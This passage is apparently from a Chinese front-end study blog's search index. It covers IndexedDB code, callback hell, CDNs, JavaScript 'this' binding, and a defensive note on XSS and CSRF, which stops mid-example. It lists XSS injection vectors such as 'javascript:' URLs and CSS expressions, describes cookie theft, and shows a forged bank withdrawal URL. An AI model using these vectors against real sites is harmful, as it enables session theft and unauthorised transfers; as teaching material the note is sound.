可以创建和删除对象存储空间以及构建和删除索引\n   }\n   ~~~\n\n3. **建立对象存储空间**\n\n   ~~~js\n   // 对象存储空间仅调用createObjectStore()就可以创建。这个方法使用存储空间的名称，和一个对象参数。即便这个参数对象是可选的，它还是非常重要的，因为它可以让我们定义重要的可选属性和完善你希望创建的对象存储空间的类型。\n   request.onupgradeneeded = function(event) {\n       const db = event.target.result\n       const objectStore = db.createObjectStore('name', { keyPath:'id' })\n   }\n   ~~~\n\n4. **操作数据**\n\n   + 添加数据\n\n     ~~~js\n     addData: function(db, storename, data) {\n         const store = store = db.transaction(storename, 'readwrite').objectStore(storename)\n         for(let i = 0; i < data.length; i++) {\n     !        const request = store.add(data[i])\n             request.onerror = function() {\n                 console.error('添加数据失败')\n             }\n             request.onsuccess = function() {\n                 console.log('添加数据成功')\n             }\n         }\n     }\n     ~~~\n\n   + 修改数据\n\n     ~~~js\n     putData: function(db, storename, data) {\n         const store = store = db.transaction(storename, 'readwrite').objectStore(storename)\n         for(let i = 0; i < data.length; i++) {\n     !        const request = store.put(data[i])\n             request.onerror = function() {\n                 console.error('修改数据失败')\n             }\n             request.onsuccess = function() {\n                 console.log('修改数据成功')\n             }\n         }\n     }\n     ~~~\n\n   + 获取数据\n\n     ~~~js\n     getDataByKey: function(db, storename, key) {\n         const store = store = db.transaction(storename, 'readwrite').objectStore(storename)\n     !    const request = store.get(key)\n         request.onerror = function() {\n             console.error('获取数据失败')\n         }\n         request.onsuccess = function(e) {\n             const result = e.target.result\n             console.log(result)\n         }\n     }\n     ~~~\n\n   + 删除数据\n\n     ~~~js\n     deleteDate: function(db, storename, key) {\n         const store = store = db.transaction(storename, 'readwrite').objectStore(storename)\n     !    store.delete(key)\n         console.log('已删除存储空间' + storename + '中的' + key + '纪录')\n     }\n     ~~~\n\n   + 关闭数据库\n\n     ~~~js\n     db.close\n     ~~~\n\n##### 5.3 优点 与其他相比\n\n+ 拥有更大的存储空间\n+ 能够处理更为复杂和结构化的数据\n+ 拥有更多的交互控制\n+ 每个 database 中可以拥有多个 database 和 table\n\n##### 5.4 局限性\n\n+ **存储空间限制**：一个单独的数据库项目大小没有限制，但可能会限制每个 IndexedDB 数据库的大小，不同浏览器有不同限制；\n+ **兼容性问题**：兼容性比前面提及的存储方案差\n+ **受同源策略限制**：把存储空间绑定到了创建它的站点的源，所以不能被其他源访问\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["html5"],"categories":["furtherNotes"]},{"title":"回调地狱及其解决方案","url":"/furtherNotes/further/03 回调地狱解决","content":"\n\n> 同步异步 promise 引申\n>\n> https://www.cnblogs.com/sonsmart/p/15265626.html\n\n\n### 1. 回调地狱\n\n#### 1.1 先导概念\n\n**回调函数**：当一个函数作为参数传入另一个参数中，其不会立即执行，只有当满足一定条件后该函数才可以执行，这种函数称为回调函数。\n\n> 其中定时器和ajax就存在回调函数\n\n> eg：\n>\n> ~~~js\n> setTimeout(function(){\n>     console.log('执行回调函数');\n> },3000)\n> ~~~\n>\n> ~~~js\n> let xhr = new XMLHttpRequest();\n> xhr.onreadystatechange = function(){ ... }\n> xhr.open(...);\n> xhr.send();\n> ~~~\n>\n> 上面的回调函数分别为：function(){ console.log() }、和onreadystatechange 绑定的函数，其中的执行条件分别为 3秒后 和 send发送请求并拿到响应后执行。\n\n\n\n**同步任务**：在主线程上排队执行，只有前一个任务执行完毕，才能执行下一个任务。\n\n**异步任务**：不进入主线程，而是进入异步队列，前一个任务是否执行完毕不影响下一个任务的执行。\n\n> eg：\n>\n> ~~~js\n> setTimeout(function(){\n>     console.log('执行回调函数');\n> },3000)\n> console.log('111');\n> ~~~\n>\n> 这种不阻塞后面任务执行的任务就叫异步任务。\n\n\n\n#### 1.2 回调地狱\n\n— 为了在异步函数当中顺序执行代码而不断**嵌套调用回调函数**\n\n> eg：\n>\n> ~~~js\n> setTimeout(function(){\n>     console.log('first');\n>     setTimeout(function(){\n>         console.log('sencond');\n>         setTimeout(function(){\n>             console.log('thrid')\n>         },1000)\n>     },1000)\n> },1000)\n> ~~~\n>\n> 这种回调函数中嵌套回调函数的情况就是回调地狱\n\n总结：**回调地狱就是为了实现代码顺序执行而出现的一种操作，**它会造成代码可读性差，后期不好维护。\n\n\n\n### 2. 如何解决回调地狱\n\n1. Promise：编写异步代码的一种方式，它仍然以自顶向下的方式执行，并且由于鼓励使用try / catch 样式错误处理而处理更多类型的错误\n2. generators 生成器可以让你暂停单个函数，而不会暂停整个程序的状态，但代码稍微复杂一些，以使代码看起来像自上而下地执行\n3. async / await 异步函数是一个建议的 es7 功能，将以更高级别的语法进一步包装生成器和承诺\n\n#### 2.1 Promise\n\n#### 2.2 Generators\n\n#### 2.3 async / await\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["es6","promise"],"categories":["furtherNotes"]},{"title":"CDN内容分发网络","url":"/furtherNotes/further/08 cdn","content":"\n> 由前端安全引申出的 cdn 的知识\n>\n> [cdn](https://juejin.cn/post/6913704568325046279)\n\n#### 4.1 简介\n\nCDN ( Content Delivery Network )，内容分发网络（跟菜鸟的仓配网络一样）。\n\n+ **主要思路：** 尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。\n\n+ **实现方法：** 通过在网络各处放置**节点服务器**所构成的在现有的互联网基础之上的一层**智能虚拟网络**，CDN系统能够实时地根据网络流量和各节点的**连接和负载**状况以及到用户的**距离**和**响应时间**等综合信息将用户的请求重新**导向离用户最近的服务节点**上，加快访问速度。\n\n+ **目的：** 使用户可**就近**取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的**响应速度**。\n\n+ **优势：**\n  1. CDN节点解决了跨运营商和跨地域访问的问题，访问延时大大降低；\n  2. 大部分请求在CDN边缘节点完成，CDN起到了分流作用，减轻了源站的负载。\n\n\n\n#### 4.2 组成\n\n内容分发网络（CDN）是由多个节点组成的。一般来讲，CDN网络主要由**中心节点**、**边缘节点**两部分构成。\n\n##### 4.2.1 中心节点\n\n中心节点包括CDN网管中心和全局负载均衡DNS重定向解析系统，负责整个CDN网络的分发及管理\n\n\n\n##### 4.2.2 边缘节点\n\nCDN边缘节点主要指异地分发节点，由**负载均衡设备、高速缓存服务器**两部分组成。\n\n**负载均衡设备**负责每个节点中各个Cache的负载均衡，保证节点的工作效率；同时还负责收集节点与周围环境的信息，保持与全局负载均衡DNS的通信，实现整个系统的负载均衡。\n\n**高速缓存服务器**（Cache）负责存储客户网站的大量信息，就像一个靠近用户的网站服务器一样响应本地用户的访问请求。通过全局负载均衡DNS的控制，用户的请求被透明地指向离他最近的节点，节点中Cache服务器就像网站的原始服务器一样，响应终端用户的请求。因其距离用户更近，故其响应时间才更快。\n\n\n\n**中心节点就像仓配网络中负责货物调配的总仓，而边缘节点就是负责存储货物的各个城市的本地仓库。**\n\n\n\n#### 4.3 基本工作流程\n\n##### 4.3.1 传统方式\n\n1. 用户在自己的浏览器中输入要访问的网站域名。\n2. 浏览器向 本地DNS服务器 请求对该域名的解析。\n3. 本地DNS服务器中如果缓存有这个域名的解析结果，则直接响应用户的解析请求。\n4. 本地DNS服务器中如果没有关于这个域名的解析结果的缓存，则以递归方式向整个DNS系统请求解析，获得应答后将结果反馈给浏览器。\n5. 浏览器得到域名解析结果，就是该域名相应的服务设备的 IP地址 。\n6. 浏览器向服务器请求内容。\n7. 服务器将用户请求内容传送给浏览器。\n\n\n\n当**使用了CDN**时，DNS 服务器根据用户 IP 地址，将域名解析成相应节点的缓存服务器IP地址，实现用户就近访问。使用 CDN 服务的网站，只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备，将需要分发的内容注入 CDN，就可以实现内容加速了。\n\n##### 4.3.2 CDN\n\n1. 当用户点击网址页面上的内容 URL，经过**本地 DNS** 系统解析，DNS 系统会最终将域名的解析权交给 **CNAME** 指向的 CDN 专用 DNS 服务器。\n2. CDN 的 DNS 服务器将 CDN 的**全局负载均衡设备** IP 地址返回用户\n3. 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求\n4. CDN 全局负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台**用户所属区域的区域负载均衡设备**，告诉用户向这太设备发起请求\n5. 基于以下这些条件的综合分析之后，区域负载均衡设备会**向全局负载均衡设备返回**一台缓存服务器的 IP 地址：\n   + 根据用户 IP 地址，判断哪一台服务器距用户最近；\n   + 根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容\n   + 查询各个服务器当前的负载请求，判断哪一台服务器尚有服务能能力\n6. 全局负载均衡设备把服务器 IP 地址返回给用户\n7. 用户向**缓存服务器**发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这服务器就要向他的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。\n\n\n\n#### 4.4 作用\n\nCDN 最常用的功能是**加速**\n\n1. **加速访问**\n\n2. **实现跨运营商、跨地域的全网覆盖**\n\n3. **保障网络安全**\n\n   > CDN的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。\n\n4. **异地备援**\n\n5. **节约成本**\n\n   > 能克服**网站分布不均**的问题，投入使用CDN加速可以实现网站的全国铺设，你根据不用考虑购买服务器与后续的托管运维，服务器之间镜像同步，也不用为了管理维护技术人员而烦恼，并且能降低网站自身建设和维护成本。\n\n6. **让你更专注业务本身**\n\n   > CDN加速厂商一般都会提供一站式服务，业务不仅限于CDN，还有配套的云存储、大数据服务、视频云服务等，而且一般会提供7x24运维监控支持，保证网络随时畅通，你可以放心使用。并且将更多的精力投入到发展自身的核心业务之上。\n\n\n\n#### 4.5 工作原理\n\n基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。\n\n##### 4.5.1 用户访问cdn资源的过程\n\n1. 用户向浏览器输入www.web.com这个域名，浏览器第一次发现本地没有DNS缓存，则向网站的DNS服务器请求；\n2. 网站的DNS域名解析器设置了CNAME，指向了www.web.51cdn.com,请求指向了CDN网络中的智能DNS负载均衡系统；\n3. 智能DNS负载均衡系统解析域名，把对用户响应速度最快的IP节点（CDN服务器）返回给用户；\n4. 用户向该IP节点（CDN服务器）发出请求；\n5. 由于是第一次访问，CDN服务器会向原web站点请求，并缓存内容；\n6. 请求结果发给用户。\n\n##### 4.5.2 cdn主要特点\n\n1. **本地Cache加速** 提高了企业站点（尤其含有大量图片和静态页面站点）的访问速度，并大大提高以上性质站点的稳定性\n2. **镜像服务** 消除了不同运营商之间互联的瓶颈造成的影响，实现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。\n3. **远程加速** 远程访问用户根据DNS负载均衡技术智能自动选择Cache服务器，选择最快的Cache服务器，加快远程访问的速度\n4. **带宽优化** 自动生成服务器的远程Mirror（镜像）cache服务器，远程用户访问时从cache服务器上读取数据，减少远程访问的带宽、分担网络流量、减轻原站点WEB服务器负载等功能。\n5. **集群抗攻击** 广泛分布的CDN节点加上节点之间的智能冗余机制，可以有效地预防黑客入侵以及降低各种D.D.o.S攻击对网站的影响，同时保证较好的服务质量 。\n\n\n\n#### 4.6 对网络的优化\n\n1. 解决服务器端的 “ 第一公里 ”问题\n2. 缓解甚至消除了不同运营商之间互联的瓶颈造成的影响\n3. 减轻了各省的出口带宽压力\n4. 缓解了骨干网的压力\n5. 优化了网上热点内容的分布\n\n\n\n**第一公里：**指万维网流量向用户传送的第一个出口，是网站服务器接入互联网的链路所能提供的带宽。这个带宽决定了一个网站能为用户提供的访问速度和并发访问量。如果业务繁忙，用户的访问数越多，拥塞越严重，网站会在最需要向用户提供服务时失去用户。\n\n**中间一公里：**代表互联网中节点与节点之间的传输网络\n\n**最后一公里：**万维网流量向用户传送的最后一段接入链路\n\n\n\n#### 4.7 应用场景\n\n1. 网站站点 / 应用加速\n2. 视音频点播 / 大文件下载分发加速\n3. 视频直播加速\n4. 移动应用加速\n\n","tags":["前端安全","网络"],"categories":["furtherNotes"]},{"title":"节流throttle、防抖debounce","url":"/furtherNotes/further/06 this指向 call bind apply","content":"\n\n## call、bind、apply、this \n\n### 1. this 指向\n\n**<font color='red'>this 永远指向最后调用它的那个对象</font>**（执行时）\n\n**匿名函数的 this 永远指向 window**\n\n> 非严格模式 全局对象 window \n>\n> 严格模式 全局对象是 undefined\n\n\n\n### 2. 改变 this 指向\n\n+ 使用箭头函数\n+ 函数内部使用 `_this = this`\n+ 使用 `apply`、`call`、`bind`\n+ `new` 实例化对象\n\n\n\n#### 2.1 箭头函数\n\n**箭头函数的 this 始终指向函数定义时的 this，而非执行时。**\n\n箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则 undefined。\n\n\n\n#### 2.2 _this = this\n\n相当于把 this 的值 保存在另一个变量 _this \n\n\n\n#### 2.3 <font color='red'>apply、call、bind</font>\n\n##### 2.3.1 apply\n\napply() 方法调用一个函数，其具有一个指定的 this 值，以及 作为一个数组（类数组对象）通过的参数\n\n`func.apply(thisArg, [argsArray])`\n\n+ thisArg：在 func 函数运行时指定的 this 值。\n\n  > 注：指定的 this 值并不一定是该函数执行时真正的 this 值，**如果函数处于非严格模式下，则指定为 null 或 undefined 会自动指向全局对象，值为原始值的 this 会指向该原始值的自动包装对象。**\n\n+ argsArrays：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。\n\n  > 如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。\n\n\n\n##### 2.3.2 call\n\ncall 与 apply 基本类似，只有传入参数的不同\n\n`func.call(thisArg[, arg1[, arg2...]])`\n\n+ call 接收的 若干个参数列表     `b.call(a, 1, 2)`\n+ apply 接收 一个包含多个参数的数组  `b.apply(a, [1,2])`\n\n\n\n##### 2.3.3 bind\n\nbind() 方法**创建一个新的函数**，所以需要被调用。\n\n`b.bind(a, 1, 2)()`\n\n\n\n#### 2.4 函数调用\n\n方法种类：\n\n1. 作为一个函数被调用\n\n   > ~~~js\n   > function a(){...}\n   > a();\n   > ~~~\n\n2. 作为对象的方法被调用\n\n   > ~~~js\n   > let a = { fn : function(){ ... } };\n   > a.fn();\n   > ~~~\n\n3. 使用构造函数调用函数\n\n   > ~~~js\n   > function func(arg){\n   >     this.age = arg;\n   > }\n   > let a = new func(18)\n   > a.age;\n   > ~~~\n\n4. 作为函数方法调用函数（ call、apply）\n\n   > 在 js 中，函数是对象。\n   >\n   >  js 函数有自己的属性和方法，其中 call() 和 apply() 是预定义的函数方法，\n   >\n   > 其可用于调用函数，两个方法的第一个参数必须是对象本事。\n   >\n   > 在 严格模式，调用函数时 第一个参数会成为 this 的值，即使该参数不是一个对象\n   >\n   > 在非严格模式，如果第一参数是 null / undefined，将使用全局对象替代\n\n   \n\n   \n\n   \n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"触底事件","url":"/furtherNotes/further/07 滚动条触底事件","content":"\n判断是否到达页面底部\n\n~~~js\n$(window).scroll(function () {  \n\tif ($('html, body').scrollTop() + window.innerHeight >= Math.floor($('html').outerHeight(true))) {\n    if (PART == 1) {\n      loadingNextPART1();\n    } else if (PART == 2) {\n      loadingNextPART2();\n    }\n  }\n}）\n~~~\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"关于网络攻击那些事儿~","url":"/furtherNotes/further/08 前端安全","content":"\n> 参考链接：\n>\n> [xss](https://blog.poetries.top/browser-working-principle/guide/part6/lesson33.html) [xss](https://juejin.cn/post/6844903685122703367)\n>\n> [csrf](https://blog.poetries.top/browser-working-principle/guide/part6/lesson34.htm)  [csrf](https://juejin.cn/post/6844903465634758669)  [csrf](https://juejin.cn/post/6844903689702866952)\n>\n> [ddos](https://zhuanlan.zhihu.com/p/112894574)\n>\n> [cdn](https://juejin.cn/post/6844903757919027208)\n>\n> [点击劫持](https://www.cnblogs.com/lovesong/p/5248483.html)  [点击劫持](https://www.jianshu.com/p/251704d8ff18)  [点击劫持](https://zhuanlan.zhihu.com/p/53197562)\n>\n> [HTST](https://zhuanlan.zhihu.com/p/25537440)\n>\n> [前端安全](https://zhuanlan.zhihu.com/p/83865185)\n\n## 前端安全\n\n> 1. XSS\n> 2. CSRF\n> 3. DDoS\n> 4. CDN 劫持\n> 5. iframe\n> 6. opener\n> 7. ClickJacking 点击劫持\n> 8. HSTS（HTTP严格传输安全）\n> 9. 泛洪\n\n\n\n### 1. XSS攻击 — 跨站脚本攻击\n\n#### 1.1 简介\n\nXSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。\n\n本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行\n\n#### 1.2 攻击的危害\n\n- 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。\n- 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。\n- 可以通过修改 DOM伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。\n- 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。\n\n\n\n#### 1.3 注入方式\n\n+ 在 html 中内嵌的文本中，恶意内容以 script 标签形式注入；\n+ 在内联的 javascript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等）\n+ 在标签属性中，恶意内容包含引号，突破属性值的限制，注入其他属性或标签；\n+ 在标签的href、src等属性中，包含 javascript: 等可执行代码；\n+ 在 onload、onerror、onclick 等事件中，注入不受控制代码；\n+ 在 style 属性和标签中，包含类似 `background-image:url(‘javascript : ...’);`的代码\n+ 在 style 属性和标签中，包含类似 `expression(...)` 的css表达式代码\n\n总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 html 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造成恶意的代码指令，进而利用恶意代码危害数据安全。\n\n\n\n#### 1.3 分类\n\n##### 1.3.1**存储型 XSS 攻击**\n\n在表单输入一段 脚本，然后这段脚本会存在数据库里，每当其他用户从数据库拿到数据渲染到页面上时，会有这一段脚本存在，当用户触发后，自己的数据就会被发送到非法服务器。\n\n> - 攻击者将恶意代码**提交到目标网站的数据库**中。\n> - 用户**打开目标网站**时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。\n> - 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。\n> - 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n>\n> 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。\n\n##### 1.3.2 **反射型 XSS 攻击**\n\nurl 里面 放 脚本，发送请求，该请求的 查询字符串会被作为 dom 节点的 内容 放到html里执行，黑客就可以利用该脚本做一些恶意操作。\n\n> 1. 攻击者**构造出特殊的 URL**，其中包含恶意代码。\n> 2. 用户**打开带有恶意代码的 URL 时**，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。\n> 3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。\n> 4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n>\n> 反射型 XSS 跟存储型 XSS 的**区别**是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。\n>\n> 反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。\n>\n> 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。\n>\n> POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。\n\n##### 1.3.3 **基于 DOM 的 XSS 攻击**\n\n跟 web 服务器没有关系\n\n> 1. 攻击者构造出特殊的 URL，其中包含恶意代码。\n> 2. 用户打开带有恶意代码的 URL。\n> 3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。\n> 4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n>\n> DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。\n>\n> \n>\n> 具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据\n\n#### 1.4 阻止预防\n\n##### 1.4.1 总结上述攻击特点\n\nhttps://juejin.cn/post/6844903685122703367#heading-8\n\n通过前面的介绍可以得知，XSS 攻击有两大要素：\n\n1. 攻击者提交恶意代码。\n2. 浏览器执行恶意代码。\n\n针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？\n\n**输入过滤:** \n\n+ **前端过滤输入，然后提交到后端**？**不可行**，一旦攻击者绕过前端过滤，直接构造请求，就可以提交尔恶意代码了\n+ **后端写入数据库前，对输入进行过滤，然后将安全内容返回给前端？不可行**在提交阶段，不确定内容要输出到哪里：可能同时提供给 前端和客户端，if 转码 客户端显示的内容是转码后的内容；在前端中不同的位置所需的编码也不一样。\n\n> 输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。\n>\n> 对于**明确的输入类型**，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的\n\n那就只能：\n\n**防止浏览器执行恶意代码**\n\n+ 防止 html 中出现注入\n+ 防止 JavaScript 执行时，执行恶意代码\n\n\n\n##### 1.4.2 预防存储型和反射型xss攻击\n\n存储型和反射型 XSS 都是在**服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。**\n\n预防这两种漏洞，有两种常见做法：\n\n- 改成纯前端渲染，把代码和数据分隔开。\n\n- 对 HTML 做充分转义。\n\n  > **转义应该在输出 HTML 时进行，而不是在提交用户输入时**\n\n###### 1.4.2.1 纯前端渲染\n\n纯前端渲染的过程：\n\n1. 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。\n2. 然后浏览器执行 HTML 中的 JavaScript。\n3. JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。\n\n在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（`.innerText`），还是属性（`.setAttribute`），还是样式（`.style`）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。\n\n**但纯前端渲染还需注意避免 DOM 型 XSS 漏洞**（例如 `onload` 事件和 `href` 中的 `javascript:xxx` 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。\n\n在很多**内部、管理**系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。\n\n\n\n###### 1.4.2.2 转义 html\n\n如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。\n\n常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 `& < > \" ' /` 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：\n\n| XSS 安全漏洞      | 简单转义是否有防护作用 |\n| ----------------- | ---------------------- |\n| HTML 标签文字内容 | 有                     |\n| HTML 属性值       | 有                     |\n| CSS 内联样式      | 无                     |\n| 内联 JavaScript   | 无                     |\n| 内联 JSON         | 无                     |\n| 跳转链接          | 无                     |\n\n所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。\n\n###### 1.4.2.3 总结\n\n存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。\n\n而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此**基于 DOM 的 XSS 攻击是属于前端的安全漏洞**。\n\n**共同点**：先往浏览器中注入恶意脚本，再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。\n\n所以**可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。**\n\n\n\n##### 1.4.3 预防 dom 型\n\nDOM 型 XSS 攻击，实际上就是**网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了**。\n\n+ 在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应**尽量使用 `.textContent`、`.setAttribute()`** 等。\n\n+ 如果用 **Vue/React 技术栈**，并且不使用 `v-html`/`dangerouslySetInnerHTML` 功能，就在前端 render 阶段避免 `innerHTML`、`outerHTML` 的 XSS 隐患。\n\n+ **DOM 中的内联事件监听器**，如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等，`<a>` 标签的 `href` 属性，JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。\n\n\n\n##### 1.4.4 其他通用预防方案\n\n1. **利用 [CSP](https://juejin.cn/post/6844903665224908807)**\n\n   CSP 的功能\n\n   + 限制加载其他域下的资源文件\n   + 禁止向第三方域提交数据，用户数据不会外泄\n   + 禁止执行内联脚本和未授权脚本\n   + 提供上报机制，帮助发现 XSS 攻击\n\n3. **使用 httpOnly**\n\n   因为很多 XSS 攻击都是用来盗 cookie 的，可以通过使用 httpOnly 属性来爆出cookie\n\n   通常服务器可以将 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的\n\n   **使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。**\n\n   > 打开谷歌的响应头\n   >\n   > ~~~js\n   > set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; \n   > expires=Sat, 18-Apr-2020 06:52:22 GMT; \n   > path=/; \n   > domain=.google.com; \n   > HttpOnly\n   > ~~~\n   >\n   > \n\n4. **使用组件**\n\n+ 前端防御组件 js-xss \n\n  ~~~js\n  npm install xss\n  \n  var xss = require('xss')\n  $('btnSure').on('click',function(){\n      let result = xss($('.input').val())\n      putout.html(result)\n  })\n  ~~~\n\n5. **限制输入内容长度**\n\n   不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。\n\n##### 1.4.5 减少攻击的产生\n\n+ 利用模板引擎：自带html转移功能\n+ 避免内联事件\n+ 避免拼接 html\n+ 增加攻击难度，降低攻击后果\n+ 主动检测和发现：用 xss 攻击字符串和自动扫描工具寻找潜在的 xss 漏洞\n\n\n\n### 2. CSRF攻击 — 跨站请求伪造\n\nCSRF（Cross-site request forgery）**跨站请求伪造**，是一种利用网站可信用户的权限去执行未授权的命令的一种恶意攻击。也称作 one-click attack 或者 session riding，其简写有时候也会使用 **XSRF**。\n\n+ CSRF ： 攻击者利用受害者的身份，以受害者的名义发送恶意请求。利用用户当前身份做一些未经过授权的事。\n+ XSS   ： 目的是获取用户的身份信息。攻击者窃取用户身份( session / cookie )。\n\n\n\n#### 2.1 CSRF 的危害\n\nCSRF可以盗用受害者的身份，完成受害者在web浏览器有权限进行的任何操作…\n\n- 以你的名义发送诈骗邮件，消息\n- 用你的账号购买商品\n- 用你的名义完成虚拟货币转账\n- 泄露个人隐私\n\n\n\n#### 2.2 产生 CSRF 条件\n\n- 目标站点一定要有 CSRF 漏洞；\n- 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；\n- 受害者有意或者无意的访问了攻击者发布的页面或者链接地址\n\n> 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 [http://bank.example/withdraw?account=bob&amount=1000000&for=bob2](https://link.zhihu.com/?target=http%3A//bank.example/withdraw%3Faccount%3Dbob%26amount%3D1000000%26for%3Dbob2) 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。\n> 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：[http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory](https://link.zhihu.com/?target=http%3A//bank.example/withdraw%3Faccount%3Dbob%26amount%3D1000000%26for%3DMallory)。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。\n> 这时，Mallory **想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码**： 